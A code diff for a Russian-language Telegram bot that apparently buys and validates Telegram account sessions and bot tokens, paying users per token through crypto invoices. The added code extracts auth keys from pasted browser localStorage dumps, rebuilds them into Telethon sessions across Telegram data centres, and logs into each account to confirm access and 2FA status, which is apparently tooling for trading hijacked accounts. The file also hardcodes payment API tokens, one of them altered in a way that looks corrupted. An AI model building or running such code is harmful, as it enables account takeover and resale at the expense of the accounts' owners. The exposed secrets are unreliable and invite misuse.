@@ -4,6 +4,9 @@ import sqlite3
 import json
 import os
 import asyncio
+import base64
+import struct
+import socket
 from typing import Dict, List, Optional
 
 import aiohttp
@@ -26,6 +29,9 @@ try:
 except ImportError:
     TELETHON_AVAILABLE = False
 
+# Отключаем отладочный спам в консоли от Telethon
+logging.getLogger('telethon').setLevel(logging.WARNING)
+
 # ==========================================
 # ⚙️ КОНФИГУРАЦИЯ
 # ==========================================
@@ -41,12 +47,21 @@ SUPPORT_TEXT = "Если у вас возникли вопросы, напиши
 SUPPORT_HOURS = "Пн–Вс, 10:00 – 22:00 (МСК)"
 
 CRYPTO_PAY_TOKEN = "668980:AAllw4XKBWnQtm7G0Z1Ko3hqhpVsymcG7lg"
-XROCKET_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IjMwODA2NSIsImp0aSI6ImFwcDozMDgwNjU6NWI2Y2NjMGMtZjg5Yy00OGZiLWFjMGUtZmU4MDQ5NzU1MmRlIiwiaWF0IjoxNzkzODkyNjYzfQ.X7OL7gEyKL0uK29bJcs2h49tm-uAtikVb6JEVDVdOPw"
+XROCKET_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IjMwODA6NQIsImp0aSI6ImFwcDozMDgwNjU6NWI2Y2NjMGMtZjg5Yy00OGZiLWFjMGUtZmU4MDQ5NzU1MmRlIiwiaWF0IjoxNzkzODkyNjYzfQ.X7OL7gEyKL0uK29bJcs2h49tm-uAtikVb6JEVDVdOPw"
 
 XROCKET_TESTNET = False
 PRICE_PER_TOKEN = 0.1
 
-SESSION_CHECK_TIMEOUT = 12
+SESSION_CHECK_TIMEOUT = 5
+
+# Официальные IP-адреса Data Center Telegram для StringSession v1
+DC_IPS = {
+    1: "149.154.175.50",
+    2: "149.154.167.51",
+    3: "149.154.175.100",
+    4: "149.154.167.91",
+    5: "91.108.56.130"
+}
 
 # ==========================================
 # 💎 EMOJI
@@ -105,12 +120,20 @@ def init_db():
                 total_tokens INTEGER DEFAULT 0,
                 total_payout REAL DEFAULT 0.0
             );
+            CREATE TABLE IF NOT EXISTS invoices (
+                invoice_id TEXT PRIMARY KEY,
+                user_id INTEGER,
+                amount REAL,
+                provider TEXT,
+                status TEXT DEFAULT 'pending'
+            );
             INSERT OR IGNORE INTO global_stats (id, total_tokens, total_payout) VALUES (1, 0, 0.0);
         """)
 
 def db_add_user(user_id: int, username: str):
     with get_db() as conn:
         conn.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, username))
+        conn.execute("UPDATE users SET username = ? WHERE user_id = ?", (username, user_id))
 
 def db_get_user(user_id: int) -> Optional[sqlite3.Row]:
     with get_db() as conn:
@@ -149,6 +172,21 @@ def db_update_stats(user_id: int, count: int, payout: float):
             (count, payout)
         )
 
+def db_save_invoice(invoice_id: str, user_id: int, amount: float, provider: str):
+    with get_db() as conn:
+        conn.execute(
+            "INSERT OR REPLACE INTO invoices (invoice_id, user_id, amount, provider, status) VALUES (?, ?, ?, ?, 'pending')",
+            (str(invoice_id), user_id, amount, provider)
+        )
+
+def db_mark_invoice_paid(invoice_id: str) -> Optional[sqlite3.Row]:
+    with get_db() as conn:
+        inv = conn.execute("SELECT user_id, amount, status FROM invoices WHERE invoice_id = ?", (str(invoice_id),)).fetchone()
+        if inv and inv["status"] == "pending":
+            conn.execute("UPDATE invoices SET status = 'paid' WHERE invoice_id = ?", (str(invoice_id),))
+            return inv
+    return None
+
 # ==========================================
 # 🛠 РЕАЛЬНАЯ ВАЛИДАЦИЯ ВХОДА В ТЕЛЕГРАМ
 # ==========================================
@@ -156,11 +194,25 @@ def db_update_stats(user_id: int, count: int, payout: float):
 BOT_TOKEN_REGEX = re.compile(r"^[0-9]{8,10}:[A-Za-z0-9_-]{35}$")
 
 def parse_web_token(text: str) -> Optional[str]:
-    """Извлекает токен из JS-кода локального хранилища браузера (localStorage/sessionStorage)."""
-    match = re.search(r'"token"\s*:\s*"([A-Za-z0-9_\-]+)"', text)
+    """Извлекает чистый токен из JS-кода локального хранилища браузера."""
+    match = re.search(r'"token"\s*:\s*"([^"]+)"', text)
     if match:
-        return match.group(1)
+        return match.group(1).strip()
+    match_single = re.search(r"'token'\s*:\s*'([^']+)'", text)
+    if match_single:
+        return match_single.group(1).strip()
+    match_raw = re.search(r'(?:auth_key|token|session)\s*[:=]\s*["\']?([A-Za-z0-9_\-]+)["\']?', text, re.IGNORECASE)
+    if match_raw:
+        return match_raw.group(1).strip()
     return None
+
+def clean_and_format_token(item: str) -> str:
+    item = item.strip()
+    extracted = parse_web_token(item)
+    if extracted:
+        item = extracted
+    item = item.strip("\"' \t\n\r")
+    return item
 
 def extract_tokens(text: str) -> List[str]:
     tokens = []
@@ -168,18 +220,16 @@ def extract_tokens(text: str) -> List[str]:
         line = line.strip()
         if not line or line.startswith("#"):
             continue
-        web_token = parse_web_token(line)
-        if web_token:
-            tokens.append(web_token)
-        else:
-            tokens.append(line)
-    return tokens
+        cleaned = clean_and_format_token(line)
+        if cleaned:
+            tokens.append(cleaned)
+    return list(dict.fromkeys(tokens))
 
 async def validate_bot_token_real(token: str) -> dict:
     url = f"https://api.telegram.org/bot{token}/getMe"
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get(url, timeout=5) as resp:
+            async with session.get(url, timeout=4) as resp:
                 if resp.status == 200:
                     data = await resp.json()
                     if data.get("ok"):
@@ -189,90 +239,103 @@ async def validate_bot_token_real(token: str) -> dict:
     except Exception:
         return {"valid": False, "type": "bot", "reason": "connection_error"}
 
+def raw_key_to_string_session(raw_key_str: str, dc_id: int = 2) -> Optional[str]:
+    try:
+        b64 = raw_key_str.replace('-', '+').replace('_', '/')
+        padding = 4 - (len(b64) % 4)
+        if padding != 4:
+            b64 += '=' * padding
+            
+        key_bytes = base64.b64decode(b64)
+        
+        if len(key_bytes) >= 256:
+            key_bytes = key_bytes[-256:]
+            
+        if len(key_bytes) == 256:
+            ip_str = DC_IPS.get(dc_id, "149.154.167.51")
+            ip_packed = socket.inet_aton(ip_str)
+            session_bytes = struct.pack('>B4sH256s', dc_id, ip_packed, 443, key_bytes)
+            return '1' + base64.b64encode(session_bytes).decode('ascii')
+    except Exception:
+        pass
+    return None
+
+async def try_connect_and_auth(session_obj) -> Optional[dict]:
+    client = TelegramClient(session_obj, TG_API_ID, TG_API_HASH)
+    try:
+        await asyncio.wait_for(client.connect(), timeout=3)
+        if await client.is_user_authorized():
+            me = await asyncio.wait_for(client.get_me(), timeout=3)
+            if me:
+                uname = f"@{me.username}" if me.username else f"ID:{me.id}"
+                return {"valid": True, "reason": f"Успешный вход ({uname})", "info": uname, "user_id": me.id}
+    except SessionPasswordNeededError:
+        return {"valid": True, "reason": "Валидный ключ (Включен 2FA)", "info": "Нужен 2FA пароль", "has_2fa": True}
+    except Exception:
+        pass
+    finally:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+    return None
+
 async def validate_telethon_session_real(session_string: str) -> dict:
-    """
-    НАСТОЯЩЕЕ ПОДКЛЮЧЕНИЕ К TELEGRAM И ПРОВЕРКА АВТОРИЗАЦИИ.
-    Поддерживает StringSession, Pyrogram сессии, веб-токены и чистые ключи.
-    """
-    session_string = session_string.strip()
+    session_string = clean_and_format_token(session_string)
     if not session_string:
         return {"valid": False, "reason": "Пустая строка сессии"}
-
-    # Проверка веб-токена (если передан сырой token из localStorage)
-    extracted_web = parse_web_token(session_string)
-    if extracted_web:
-        session_string = extracted_web
 
     if not TELETHON_AVAILABLE:
         return {"valid": False, "reason": "Telethon не установлен"}
 
-    client = None
+    # 1. Попытка подключения как стандартной StringSession
     try:
-        try:
-            session_obj = StringSession(session_string)
-        except Exception as se:
-            return {"valid": False, "reason": f"Некорректный формат строки сессии ({type(se).__name__})"}
+        session_obj = StringSession(session_string)
+        res = await try_connect_and_auth(session_obj)
+        if res:
+            return res
+    except Exception:
+        pass
 
-        client = TelegramClient(session_obj, TG_API_ID, TG_API_HASH)
-        
-        # Подключаемся по протоколу MTProto
-        await asyncio.wait_for(client.connect(), timeout=SESSION_CHECK_TIMEOUT)
-
-        # Подтверждаем наличие авторизации
-        if not await client.is_user_authorized():
-            return {"valid": False, "reason": "Сессия не авторизована или мертва"}
-
-        # Запрашиваем профиль
-        me = await asyncio.wait_for(client.get_me(), timeout=SESSION_CHECK_TIMEOUT)
-        
-        if me:
-            uname = f"@{me.username}" if me.username else f"ID:{me.id}"
-            return {"valid": True, "reason": f"Успешный вход ({uname})", "user_id": me.id}
-        else:
-            return {"valid": False, "reason": "Не удалось получить профиль"}
-
-    except SessionPasswordNeededError:
-        return {"valid": True, "reason": "Валидный ключ (Включен 2FA)", "has_2fa": True}
-
-    except (AuthKeyUnregisteredError, AuthKeyInvalidError, SessionRevokedError):
-        return {"valid": False, "reason": "Сессия аннулирована / ключ сменен"}
-
-    except (UserDeactivatedError, UserDeactivatedBanError):
-        return {"valid": False, "reason": "Аккаунт забанен или удален"}
-
-    except AuthKeyError:
-        return {"valid": False, "reason": "Недействительный ключ AuthKey"}
-
-    except asyncio.TimeoutError:
-        return {"valid": False, "reason": "Таймаут ожидания ответа Telegram"}
-
-    except ValueError as ve:
-        return {"valid": False, "reason": f"Неверный формат StringSession ({ve})"}
-
-    except Exception as e:
-        return {"valid": False, "reason": f"Ошибка входа: {type(e).__name__}"}
-
-    finally:
-        if client:
+    # 2. Быстрый асинхронный поиск нужного DC для конвертированного AuthKey
+    tasks = []
+    for dc in [2, 1, 4, 3, 5]:
+        converted = raw_key_to_string_session(session_string, dc_id=dc)
+        if converted:
             try:
-                await client.disconnect()
+                session_obj = StringSession(converted)
+                tasks.append(try_connect_and_auth(session_obj))
             except Exception:
                 pass
 
+    if tasks:
+        completed_results = await asyncio.gather(*tasks, return_exceptions=True)
+        for res in completed_results:
+            if isinstance(res, dict) and res.get("valid"):
+                return res
+
+    return {"valid": False, "reason": "Сессия не авторизована или ключ сменен"}
+
 async def real_check_token_or_session(item: str) -> dict:
-    item = item.strip()
+    item = clean_and_format_token(item)
     if BOT_TOKEN_REGEX.match(item):
         return await validate_bot_token_real(item)
-    return await validate_telethon_session_real(item)
+    try:
+        return await asyncio.wait_for(validate_telethon_session_real(item), timeout=SESSION_CHECK_TIMEOUT)
+    except asyncio.TimeoutError:
+        return {"valid": False, "reason": "Таймаут подключения к Telegram"}
+    except Exception as e:
+        return {"valid": False, "reason": f"Ошибка: {type(e).__name__}"}
 
 def convert_tokens(tokens: List[str], target_fmt: str) -> str:
+    cleaned_tokens = [clean_and_format_token(t) for t in tokens if clean_and_format_token(t)]
     if target_fmt == "txt":
-        return "\n".join(tokens)
+        return "\n".join(cleaned_tokens)
     elif target_fmt == "json":
-        return json.dumps([{"id": i + 1, "token": t} for i, t in enumerate(tokens)], indent=4, ensure_ascii=False)
+        return json.dumps([{"id": i + 1, "token": t} for i, t in enumerate(cleaned_tokens)], indent=4, ensure_ascii=False)
     elif target_fmt == "web":
-        return json.dumps({"version": "1.0", "count": len(tokens), "tokens": [{"token": t} for t in tokens]}, indent=2, ensure_ascii=False)
-    return "\n".join(tokens)
+        return json.dumps({"version": "1.0", "count": len(cleaned_tokens), "tokens": [{"token": t} for t in cleaned_tokens]}, indent=2, ensure_ascii=False)
+    return "\n".join(cleaned_tokens)
 
 # ==========================================
 # 💳 ПЛАТЕЖНЫЕ ФУНКЦИИ
@@ -292,7 +355,27 @@ async def create_cryptobot_invoice(user_id: int, amount_usd: float):
         )
         inv_id = str(invoice["invoice_id"])
         PENDING_INVOICES[inv_id] = (user_id, amount_usd, "crypto")
+        db_save_invoice(inv_id, user_id, amount_usd, "crypto")
         return invoice["pay_url"], inv_id
+
+async def verify_cryptobot_invoice_single(inv_id: str) -> bool:
+    try:
+        from crypto_pay_api import CryptoPayAsync, CryptoPayConfig
+        cfg = CryptoPayConfig(token=CRYPTO_PAY_TOKEN)
+        async with CryptoPayAsync(cfg) as cp:
+            invoices = await cp.get_invoices(invoice_ids=inv_id)
+            if invoices:
+                inv = invoices[0]
+                if inv.get("status") == "paid":
+                    res = db_mark_invoice_paid(inv_id)
+                    if res:
+                        db_add_balance(res["user_id"], res["amount"])
+                        return True
+                    else:
+                        return True
+    except Exception as e:
+        logging.error(f"Single invoice check error: {e}")
+    return False
 
 async def create_xrocket_invoice(user_id: int, amount_usd: float):
     from aiorocket2 import xRocketClient
@@ -306,50 +389,55 @@ async def create_xrocket_invoice(user_id: int, amount_usd: float):
     )
     inv_id = str(invoice.id)
     PENDING_INVOICES[inv_id] = (user_id, amount_usd, "xrocket")
+    db_save_invoice(inv_id, user_id, amount_usd, "xrocket")
     pay_url = getattr(invoice, "url", None) or getattr(invoice, "link", None)
     if not pay_url:
         raise ValueError("xRocket invoice has no payment URL")
     return pay_url, inv_id
 
 async def check_pending_invoices(context: ContextTypes.DEFAULT_TYPE):
-    if not PENDING_INVOICES:
-        return
+    with get_db() as conn:
+        pending_rows = conn.execute("SELECT invoice_id, user_id, amount, provider FROM invoices WHERE status = 'pending'").fetchall()
 
-    crypto_ids = [iid for iid, (_, _, m) in PENDING_INVOICES.items() if m == "crypto"]
-    if crypto_ids:
-        try:
-            from crypto_pay_api import CryptoPayAsync, CryptoPayConfig
-            cfg = CryptoPayConfig(token=CRYPTO_PAY_TOKEN)
-            async with CryptoPayAsync(cfg) as cp:
-                invoices = await cp.get_invoices(invoice_ids=",".join(crypto_ids))
-                for inv in invoices:
-                    if inv["status"] == "paid":
-                        iid = str(inv["invoice_id"])
-                        if iid in PENDING_INVOICES:
-                            uid, amt, _ = PENDING_INVOICES.pop(iid)
-                            db_add_balance(uid, amt)
-                            try:
-                                await context.bot.send_message(
-                                    uid, f"{E_PARTY} <b>Баланс пополнен на {amt:.2f} $!</b>",
-                                    parse_mode='HTML'
-                                )
-                            except Exception:
-                                pass
-        except Exception as e:
-            logging.error(f"CryptoBot check error: {e}")
+    for row in pending_rows:
+        iid = row["invoice_id"]
+        uid = row["user_id"]
+        amt = row["amount"]
+        provider = row["provider"]
 
-    rocket_ids = [iid for iid, (_, _, m) in PENDING_INVOICES.items() if m == "xrocket"]
-    if rocket_ids:
-        try:
-            from aiorocket2 import xRocketClient
-            from aiorocket2.enums import InvoiceStatus
-            client = xRocketClient(api_key=XROCKET_API_KEY, testnet=XROCKET_TESTNET)
-            for iid in rocket_ids:
-                try:
-                    inv = await client.get_invoice(int(iid))
-                    if inv.status == InvoiceStatus.PAID:
-                        uid, amt, _ = PENDING_INVOICES.pop(iid)
+        if provider == "crypto":
+            try:
+                from crypto_pay_api import CryptoPayAsync, CryptoPayConfig
+                cfg = CryptoPayConfig(token=CRYPTO_PAY_TOKEN)
+                async with CryptoPayAsync(cfg) as cp:
+                    invoices = await cp.get_invoices(invoice_ids=iid)
+                    for inv in invoices:
+                        if inv.get("status") == "paid":
+                            res = db_mark_invoice_paid(iid)
+                            if res:
+                                db_add_balance(uid, amt)
+                                PENDING_INVOICES.pop(iid, None)
+                                try:
+                                    await context.bot.send_message(
+                                        uid, f"{E_PARTY} <b>Баланс пополнен на {amt:.2f} $!</b>",
+                                        parse_mode='HTML'
+                                    )
+                                except Exception:
+                                    pass
+            except Exception as e:
+                logging.error(f"CryptoBot check error for invoice {iid}: {e}")
+
+        elif provider == "xrocket":
+            try:
+                from aiorocket2 import xRocketClient
+                from aiorocket2.enums import InvoiceStatus
+                client = xRocketClient(api_key=XROCKET_API_KEY, testnet=XROCKET_TESTNET)
+                inv = await client.get_invoice(int(iid))
+                if inv.status == InvoiceStatus.PAID:
+                    res = db_mark_invoice_paid(iid)
+                    if res:
                         db_add_balance(uid, amt)
+                        PENDING_INVOICES.pop(iid, None)
                         try:
                             await context.bot.send_message(
                                 uid, f"{E_PARTY} <b>Баланс пополнен на {amt:.2f} $!</b>",
@@ -357,10 +445,8 @@ async def check_pending_invoices(context: ContextTypes.DEFAULT_TYPE):
                             )
                         except Exception:
                             pass
-                except Exception as e:
-                    logging.error(f"xRocket invoice {iid} check error: {e}")
-        except Exception as e:
-            logging.error(f"xRocket init error: {e}")
+            except Exception as e:
+                logging.error(f"xRocket invoice {iid} check error: {e}")
 
 # ==========================================
 # 🎨 КНОПКИ И МЕНЮ
@@ -434,9 +520,10 @@ def topup_method_buttons(amount: float):
         [make_btn("Отмена", "my_profile", style="danger")]
     ])
 
-def topup_pay_buttons(url: str):
+def topup_pay_buttons(url: str, inv_id: str):
     return InlineKeyboardMarkup([
         [make_btn("Оплатить", url=url, style="success")],
+        [make_btn("🔄 Проверить оплату", f"check_payment:{inv_id}", style="primary")],
         [make_btn("В профиль", "my_profile", style="danger")]
     ])
 
@@ -548,6 +635,9 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "my_profile":
         u = db_get_user(user_id)
+        if not u:
+            db_add_user(user_id, query.from_user.username or "Anonymous")
+            u = db_get_user(user_id)
         text = (
             f"{E_USER} <b>Ваш Профиль</b>\n\n"
             f"<b>ID:</b> <code>{user_id}</code>\n"
@@ -570,13 +660,13 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         amount = float(amount_str)
         try:
             if method == "crypto":
-                url, _ = await create_cryptobot_invoice(user_id, amount)
+                url, inv_id = await create_cryptobot_invoice(user_id, amount)
             else:
-                url, _ = await create_xrocket_invoice(user_id, amount)
+                url, inv_id = await create_xrocket_invoice(user_id, amount)
             await query.edit_message_text(
                 f"{E_CHECK} <b>Счёт создан на {amount:.2f} $</b>\n\n"
-                f"Оплатите по кнопке ниже. Баланс зачислится автоматически.",
-                parse_mode='HTML', reply_markup=topup_pay_buttons(url)
+                f"Оплатите по кнопке ниже и нажмите кнопку «Проверить оплату».",
+                parse_mode='HTML', reply_markup=topup_pay_buttons(url, inv_id)
             )
         except Exception as e:
             logging.error(f"Invoice creation error: {e}")
@@ -584,6 +674,20 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"{E_WARN} Ошибка создания счёта: {e}",
                 parse_mode='HTML', reply_markup=back_button()
             )
+
+    elif data.startswith("check_payment:"):
+        _, inv_id = data.split(":")
+        is_paid = await verify_cryptobot_invoice_single(inv_id)
+        if is_paid:
+            u = db_get_user(user_id)
+            await query.answer("Успешно! Баланс пополнен.", show_alert=True)
+            await query.edit_message_text(
+                f"{E_PARTY} <b>Оплата подтверждена!</b>\n\n"
+                f"Ваш текущий баланс: <b>{u['balance']:.2f} $</b>",
+                parse_mode='HTML', reply_markup=profile_buttons(is_admin)
+            )
+        else:
+            await query.answer("Оплата еще не поступила. Попробуйте снова после оплаты.", show_alert=True)
 
     elif data == "global_stats":
         u_cnt, tokens, payout = db_get_stats()
@@ -756,10 +860,11 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     elif step == "entering_count":
-        if not update.message.text.isdigit() or int(update.message.text) <= 0:
+        text_content = update.message.text or ""
+        if not text_content.isdigit() or int(text_content) <= 0:
             await update.message.reply_html(f"{E_WARN} Введите корректное число!", reply_markup=cancel_button())
             return
-        state["count"] = int(update.message.text)
+        state["count"] = int(text_content)
         state["step"] = "sending_tokens"
         await update.message.reply_html(
             f"{E_LOCK} <b>Количество: {state['count']} шт.</b>\n\nОтправьте файл сессий или токены текстом:",
@@ -793,12 +898,16 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         valid_tokens = []
         invalid_tokens = []
 
-        for item in extracted:
-            res = await real_check_token_or_session(item)
-            if res.get("valid"):
+        # Быстрая параллельная проверка всех сессий
+        tasks = [real_check_token_or_session(item) for item in extracted]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+
+        for item, res in zip(extracted, results):
+            if isinstance(res, dict) and res.get("valid"):
                 valid_tokens.append((item, res))
             else:
-                invalid_tokens.append((item, res))
+                reason = res.get("reason", "Ошибка входа") if isinstance(res, dict) else "Ошибка связи"
+                invalid_tokens.append((item, {"reason": reason}))
 
         try:
             await status_msg.delete()
@@ -908,10 +1017,15 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         status_msg = await update.message.reply_html(f"⏳ <b>Выполняется подключение к Telegram и запуск сессий...</b>")
 
+        tasks = [real_check_token_or_session(token) for token in tokens_to_check]
+        check_responses = await asyncio.gather(*tasks, return_exceptions=True)
+
         results = []
-        for token in tokens_to_check:
-            res = await real_check_token_or_session(token)
-            results.append((token, res))
+        for token, res in zip(tokens_to_check, check_responses):
+            if isinstance(res, dict):
+                results.append((token, res))
+            else:
+                results.append((token, {"valid": False, "reason": "Ошибка входа"}))
 
         valid_count = sum(1 for _, res in results if res.get("valid"))
         invalid_count = len(results) - valid_count
